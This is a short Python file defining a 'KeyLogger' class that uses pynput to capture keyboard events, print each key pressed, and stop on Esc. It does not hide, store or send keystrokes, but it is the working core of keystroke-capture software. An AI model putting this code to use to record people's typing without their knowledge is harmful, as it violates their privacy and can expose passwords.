from pynput.keyboard import Key, Listener

class KeyLogger:

    def __init__(self):
        self.__run()

    def __run(self):
        with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
            listener.join()

    def __on_press(self, key):
        print("{0} pressed".format(key))
    
    def __on_release(self, key):
        if key == Key.esc:
            return False

